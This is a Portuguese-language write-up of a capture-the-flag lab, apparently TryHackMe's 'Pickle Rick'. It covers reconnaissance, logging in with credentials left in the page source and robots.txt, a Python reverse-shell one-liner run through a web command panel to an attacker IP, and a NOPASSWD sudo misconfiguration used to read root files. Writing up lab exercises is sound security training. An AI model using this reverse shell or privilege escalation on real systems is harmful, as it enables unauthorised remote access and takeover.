@@ -1,0 +1,57 @@
+IP = 10.10.211.179
+
+Pesquisando pelo endereço no google somos direcionado para um site
+
+Olhando o código fonte encontramos o seguinte comentário:
+'''
+Note to self, remember username!
+Username: R1ckRul3s
+'''
+
+Rodando o nmap encontrei duas portas abertas:
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+
+Rodando no gobuster encontrei os diretórios:
+°/robots.txt:
+ ->Wubbalubbadubdub
+°/assets
+
+No nikto descobri o arquivo login.php e acessando realizei o login
+-> User: R1ckRul3s
+-> Senha: Wubbalubbadubdub
+
+Acessando tem uma págin com um painel de comando que é capaz de executar comandos bash
+Para acessar por terminal realizei um shell reverso com python:
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.17.95",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+E gerei um bash interativo para melhor interação:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Agora dentro da máquina fui investigar
+Arquivos/diretórios existentes na página inicial:
+    °Sup3rS3cretPickl3Ingred.txt:
+     -> mr. meeseek hair
+    °assets
+    °clue.txt:
+     -> Look around the file system for the other ingredient.
+    °denied.php
+    °index.html
+    °login.php
+    °portal.php
+    °robots.txt
+    
+Procurando mais pelos ingredientes( cd /home/rick; less "second ingredients") fui até o home do rick e encontrei o segundo ingrediente:
+1 jerry tear
+
+Verificando as permissões de sudo( sudo -l) verificamos uma vulnerabilidade:
+(ALL) NOPASSWD: ALL
+Isso diz que os usuários não precisam da senha para acessar o sudo, logo podemos executar qualquer comando assim
+Dessa forma naveguei até a pasta root e encontrei o segundo ingrediente:
+sudo less /root/3rd.txt
+-> 3rd ingredients: fleeb juice
+================================================================================
+Ingredientes:
+1 - mr. meeseek hair
+2 - 1 jerry tear
+3 - fleeb juice
